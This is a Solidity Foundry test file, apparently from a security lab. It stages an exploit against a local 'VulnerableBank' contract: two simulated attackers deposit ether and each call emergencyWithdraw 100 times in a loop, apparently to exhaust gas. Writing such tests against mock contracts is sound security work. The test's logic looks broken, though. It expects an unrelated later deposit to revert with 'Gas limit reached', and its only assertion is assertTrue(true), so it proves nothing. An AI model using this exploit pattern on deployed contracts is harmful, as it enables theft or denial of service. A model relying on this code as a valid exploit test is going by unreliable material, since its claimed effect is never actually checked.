// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankExploit is BaseTestWithBalanceLog {
    VulnerableBank target;

    function setUp() public override {
        target = new VulnerableBank();
    }

    function testExploit() public {
        uint256 initialAmount = 1 ether;
        address attacker = vm.addr(0x1);
        address anotherAttacker = vm.addr(0x2);

        // Transfer initial amount to the bank contract
        target.deposit{value: initialAmount}(attacker);
        target.deposit{value: initialAmount}(anotherAttacker);

        // Simulate an attacker calling emergencyWithdraw from each controlled account
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 100; i++) {
            target.emergencyWithdraw();
        }
        vm.stopPrank();

        vm.startPrank(anotherAttacker);
        for (uint256 i = 0; i < 100; i++) {
            target.emergencyWithdraw();
        }
        vm.stopPrank();

        // Validate the gas consumption and impact on the block gas limit
        vm.expectRevert("Gas limit reached");
        target.deposit{value: initialAmount}(vm.addr(0x3));
        
        balanceLog("Final balances:", [
            balance(attacker),
            balance(anotherAttacker),
            address(target).balance
        ]);

        assertTrue(true);
    }
}